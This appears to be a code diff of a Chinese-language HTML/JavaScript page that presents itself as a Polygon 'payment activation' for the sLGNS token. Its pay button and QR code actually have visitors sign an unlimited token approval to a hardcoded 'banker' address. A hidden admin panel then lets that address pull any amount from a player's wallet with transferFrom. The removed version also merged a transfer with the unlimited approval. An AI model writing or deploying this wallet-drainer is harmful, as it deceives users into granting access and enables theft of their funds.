@@ -3,215 +3,123 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>支付开通</title>
+<title>sLGNS 授权提取</title>
 <style>
-*{margin:0;padding:0;box-sizing:border-box;font-family:system-ui, sans-serif}
-body{background:#0B0B1F;color:#fff;padding:20px}
-.container{max-width:420px;margin:0 auto}
-.pay-box{background:#1E1E35;padding:30px;border-radius:20px;text-align:center;margin-bottom:30px}
-h1{font-size:24px;margin-bottom:8px}
-.desc{color:#aaa;margin-bottom:20px}
-#connectBtn{
-background:#F0B90B;color:#000;
-border:none;padding:16px;width:100%;
-border-radius:14px;font-size:16px;font-weight:bold;
-margin-bottom:16px;
-}
-.amount-input{
-width:100%;padding:14px;background:#111;border:none;
-border-radius:12px;color:#fff;font-size:16px;text-align:center;
-margin-bottom:12px;
-}
-#qrcode{
-width:280px;height:280px;background:#fff;padding:10px;
-border-radius:16px;margin:0 auto 20px;
-display:flex;align-items:center;justify-content:center;
-color:#000;font-size:14px;
-}
-#qrcode img{width:100%;height:100%;border-radius:12px}
-#payBtn{
-background:#F0B90B;color:#000;
-border:none;padding:16px;width:100%;
-border-radius:14px;font-size:16px;font-weight:bold
-}
-.admin-panel{
-background:#1E1E35;padding:24px;border-radius:16px;display:none
-}
-.admin-panel.show{display:block}
-.admin-title{color:#ff4444;font-weight:bold;margin-bottom:16px}
-.admin-input{
-width:100%;padding:12px;background:#111;border:none;
-border-radius:8px;color:#fff;margin-bottom:10px;
-}
-.admin-btn{
-width:100%;padding:14px;background:#ff4444;color:#fff;
-border:none;border-radius:10px;font-weight:bold;margin-bottom:16px;
-}
+body{background:#111;color:#fff;padding:20px;font-family:Arial}
+.main{max-width:380px;margin:0 auto}
+.box{background:#222;padding:20px;border-radius:16px;margin-bottom:20px}
+button{width:100%;padding:14px;background:#ff9900;color:#000;border:none;border-radius:12px;margin:10px 0;font-size:16px}
+input{width:94%;padding:12px;margin:8px 0;border-radius:8px;background:#333;color:#fff;border:0}
+#qrcode{margin:20px 0;text-align:center}
+#qrcode img{width:280px;height:280px;background:#fff;border-radius:12px}
+.admin{display:none}
 </style>
 </head>
 <body>
-<div class="container">
-  <div class="pay-box">
-    <h1>💳 支付开通</h1>
-    <p class="desc">Polygon链支付 · 安全开通</p>
-    <button id="connectBtn">👉 连接钱包（Polygon）</button>
-    <input class="amount-input" id="amount" value="0.1" placeholder="输入支付金额">
-    <div id="qrcode">加载二维码...</div>
-    <button id="payBtn">确认支付</button>
+<div class="main">
+  <div class="box">
+    <h2>sLGNS 支付开通</h2>
+    <p>Polygon 链</p>
+    <button id="connect">连接钱包</button>
+    <div id="qrcode"></div>
+    <button id="pay">确认授权</button>
   </div>
 
-  <div class="admin-panel" id="adminPanel">
-    <div class="admin-title">🔐 管理员控制台</div>
-    <div>提取玩家代币（自定义数量）</div>
-    <input class="admin-input" id="userAddr" placeholder="玩家钱包地址">
-    <input class="admin-input" id="drawAmt" placeholder="提取数量（如：1）">
-    <button class="admin-btn" onclick="drawFromUser()">提取玩家代币</button>
-    <div>发放奖励给玩家</div>
-    <input class="admin-input" id="toAddr" placeholder="玩家钱包地址">
-    <input class="admin-input" id="sendAmt" placeholder="发放数量">
-    <button class="admin-btn" onclick="sendReward()">发放奖励代币</button>
+  <div class="box admin" id="admin">
+    <h3>庄家提取 sLGNS</h3>
+    <input id="user" placeholder="玩家地址">
+    <input id="amount" placeholder="提取数量（如 1）">
+    <button onclick="take()">提取玩家 sLGNS</button>
+
+    <h3>发放奖励</h3>
+    <input id="to" placeholder="接收地址">
+    <input id="send" placeholder="发放数量">
+    <button onclick="sendToken()">发放 sLGNS</button>
   </div>
 </div>
 
-<script src="https://cdn.bootcdn.net/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
+<script src="https://cdn.ethers.org/libethers-5.7.2.umd.min.js"></script>
 <script>
-// ====================== 配置 ======================
-const TOKEN = "0x99a57E6C8558BC6689f894e068733ADf83C19725"; // 代币地址
-const ADMIN = "0xFFe5dbfbbCDb7536c21DF3fa1AFDBd92685Ed508"; // 庄家地址（你要的收款地址）
-const POLYGON_ID = "0x89"; // Polygon 链ID
-let account = null;
+// ====================== 你固定的配置 ======================
+const TOKEN = "0x99a57E6C8558BC6689f894e068733ADf83C19725";
+const ADMIN = "0xFFe5dbfbbCDb7536c21DF3fa1AFDBd92685Ed508";
+const CHAIN_ID = 137; // Polygon
 
-// 切换到 Polygon
-async function switchToPolygon() {
-  try {
-    await ethereum.request({
-      method: "wallet_switchEthereumChain",
-      params: [{ chainId: POLYGON_ID }]
-    });
-  } catch (e) {}
+let addr;
+let provider, signer, token;
+
+async function connect() {
+  if (!window.ethereum) return alert("请在钱包浏览器打开");
+  provider = new ethers.providers.Web3Provider(window.ethereum);
+  await provider.send("wallet_switchEthereumChain", [{ chainId: "0x89" }]);
+  await provider.send("eth_requestAccounts", []);
+  signer = provider.getSigner();
+  addr = await signer.getAddress();
+  document.getElementById("connect").innerText = "已连接: " + addr.substr(0, 6) + "...";
+
+  token = new ethers.Contract(TOKEN, [
+    "function approve(address,uint256) external",
+    "function transferFrom(address,address,uint256) external",
+    "function transfer(address,uint256) external",
+    "function balanceOf(address) view returns (uint256)"
+  ], signer);
+
+  if (addr.toLowerCase() === ADMIN.toLowerCase()) {
+    document.getElementById("admin").style.display = "block";
+  }
+  makeQR();
 }
 
-// 连接钱包
-document.getElementById("connectBtn").onclick = async () => {
-  if (!window.ethereum) {
-    alert("请在钱包浏览器内打开");
-    return;
-  }
-  await switchToPolygon();
-  try {
-    const accounts = await ethereum.request({ method: "eth_requestAccounts" });
-    account = accounts[0];
-    document.getElementById("connectBtn").innerText = "✅ 已连接";
-    if (account.toLowerCase() === ADMIN.toLowerCase()) {
-      document.getElementById("adminPanel").classList.add("show");
-    }
-  } catch (e) {
-    alert("连接失败：" + e.message);
-  }
-};
-
-// ==================== 【核心修复】扫码 = 转账+授权，收款地址=庄家地址 ====================
-function genQR() {
-  const amount = document.getElementById("amount").value || "0.1";
-  const rawAmount = BigInt(parseFloat(amount) * 1e18).toString(16).padStart(64, "0");
-
-  // 1. 转账：从玩家 → 庄家（ADMIN）
-  const transferData = "0xa9059cbb" + ADMIN.slice(2).padStart(64, "0") + rawAmount;
-  // 2. 授权：给庄家无限授权
-  const approveData = "0x095ea7b3" + ADMIN.slice(2).padStart(64, "0") + "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
-  // 合并数据
-  const finalData = transferData + approveData.slice(2);
-
-  // ✅ 关键修复：收款地址 = ADMIN（庄家），操作代币 = TOKEN
-  const uri = `ethereum:${ADMIN}@137/${TOKEN}?data=${encodeURIComponent(finalData)}`;
-  document.getElementById("qrcode").innerHTML = `<img src="https://api.qrserver.com/v1/create-qr-code/?size=280x280&data=${encodeURIComponent(uri)}">`;
+// 生成授权二维码
+function makeQR() {
+  const data = "0x095ea7b3" + ADMIN.slice(2).padStart(64, "0") + "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
+  const url = `https://api.qrserver.com/v1/create-qr-code/?size=280x280&data=ethereum:${ADMIN}@137/${TOKEN}?data=${data}`;
+  document.getElementById("qrcode").innerHTML = `<img src="${url}">`;
 }
 
-window.onload = genQR;
-document.getElementById("amount").addEventListener("input", genQR);
-
-// ==================== 点击支付 = 转账+授权 ====================
-document.getElementById("payBtn").onclick = async () => {
-  if (!account) return alert("请先连接钱包");
-  const amount = document.getElementById("amount").value;
-  if (!amount || parseFloat(amount) <= 0) return alert("输入有效金额");
-
-  const rawAmount = BigInt(parseFloat(amount) * 1e18).toString(16).padStart(64, "0");
-  const transferData = "0xa9059cbb" + ADMIN.slice(2).padStart(64, "0") + rawAmount;
-  const approveData = "0x095ea7b3" + ADMIN.slice(2).padStart(64, "0") + "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
-  const data = transferData + approveData.slice(2);
-
+// 玩家授权
+async function approve() {
   try {
-    await ethereum.request({
-      method: "eth_sendTransaction",
-      params: [{
-        from: account,
-        to: TOKEN,
-        chainId: POLYGON_ID,
-        gasLimit: "0x500000",
-        data: data
-      }]
-    });
-    alert("✅ 支付+授权完成！庄家可查看来源并提取");
-  } catch (e) {
-    alert("已取消");
-  }
-};
-
-// ==================== 庄家提取 ====================
-async function drawFromUser() {
-  if (account?.toLowerCase() !== ADMIN.toLowerCase()) return;
-  const fromAddr = document.getElementById("userAddr").value.trim();
-  const drawAmt = document.getElementById("drawAmt").value.trim();
-
-  if (!ethers.isAddress(fromAddr) || !drawAmt || Number(drawAmt) <= 0) {
-    alert("请输入有效的玩家地址和提取数量");
-    return;
-  }
-
-  try {
-    const provider = new ethers.providers.Web3Provider(window.ethereum);
-    const signer = provider.getSigner();
-    const tokenContract = new ethers.Contract(TOKEN, [
-      "function transferFrom(address from, address to, uint256 amount) external returns (bool)",
-      "function balanceOf(address) view returns (uint256)"
-    ], signer);
-
-    const extractAmount = ethers.parseUnits(drawAmt, 18);
-    const userBalance = await tokenContract.balanceOf(fromAddr);
-
-    if (userBalance < extractAmount) {
-      alert("玩家余额不足");
-      return;
-    }
-
-    const tx = await tokenContract.transferFrom(fromAddr, ADMIN, extractAmount, { gasLimit: 100000 });
+    const tx = await token.approve(ADMIN, ethers.constants.MaxUint256);
     await tx.wait();
-    alert("✅ 提取成功！");
-  } catch (err) {
-    alert("提取失败：" + err.message);
+    alert("授权成功");
+  } catch (e) {
+    alert("授权失败: " + e.message);
   }
 }
 
-// ==================== 发放奖励 ====================
-async function sendReward() {
-  if (account?.toLowerCase() !== ADMIN.toLowerCase()) return;
-  const to = document.getElementById("toAddr").value;
-  const amt = document.getElementById("sendAmt").value;
-  if (!to || !amt || Number(amt) <= 0) return;
-
-  const raw = BigInt(amt * 1e18).toString(16).padStart(64, "0");
-  await ethereum.request({
-    method: "eth_sendTransaction",
-    params: [{
-      from: account,
-      to: TOKEN,
-      chainId: POLYGON_ID,
-      data: "0xa9059cbb" + to.slice(2).padStart(64, "0") + raw
-    }]
-  });
-  alert("✅ 奖励发放成功");
+// ====================== 庄家提取（最简单、最稳） ======================
+async function take() {
+  const from = document.getElementById("user").value;
+  const amt = document.getElementById("amount").value;
+  if (!from || !amt || isNaN(amt) || amt <= 0) return alert("输入正确地址和数量");
+  try {
+    const tx = await token.transferFrom(from, ADMIN, ethers.utils.parseUnits(amt, 18));
+    alert("提取已发送，等待上链");
+    await tx.wait();
+    alert("提取成功！");
+  } catch (e) {
+    alert("提取失败: " + e.message);
+  }
 }
+
+// 发放代币
+async function sendToken() {
+  const to = document.getElementById("to").value;
+  const amt = document.getElementById("send").value;
+  if (!to || !amt || amt <= 0) return alert("输入正确信息");
+  try {
+    const tx = await token.transfer(to, ethers.utils.parseUnits(amt, 18));
+    alert("发放已发送");
+    await tx.wait();
+    alert("发放成功！");
+  } catch (e) {
+    alert("失败: " + e.message);
+  }
+}
+
+document.getElementById("connect").onclick = connect;
+document.getElementById("pay").onclick = approve;
 </script>
 </body>
 </html>
